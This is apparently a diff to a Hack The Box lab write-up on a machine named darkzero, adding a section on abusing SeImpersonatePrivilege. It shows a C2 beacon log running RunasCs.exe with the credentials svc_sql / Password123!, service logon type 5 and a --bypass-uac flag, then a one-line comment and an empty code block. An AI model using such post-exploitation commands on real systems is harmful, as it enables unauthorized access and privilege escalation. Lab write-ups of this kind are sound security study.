@@ -688,3 +688,24 @@ Now the password is changed i can use the credentials to login with login type 5
 
 # Abusing `SeImpersonatePrivilege`
 
+```python
++--- Task [e8e28b4e] closed ----------------------------------------------------------+
+
+[20/08 21:32:24] ethan [f01b513c] beacon > execute-assembly /home/kali/htb/darkzero/RunasCs.exe svc_sql Password123! -d darkzero.ext -l 5 whoami --bypass-uac
+[20/08 21:32:24] [*] Task: execute .NET assembly
+[20/08 21:32:24] [*] Agent called server, sent [61.64 Kb]
+[20/08 21:32:25] [+] BOF output
+
+
+
+darkzero-ext\svc_sql
+[20/08 21:32:25] [+] BOF finished
+
++--- Task [f01b513c] closed ----------------------------------------------------------+
+```
+
+As seen here i can now authenticate with logon type 5 (service logon)
+
+```python
+
+```
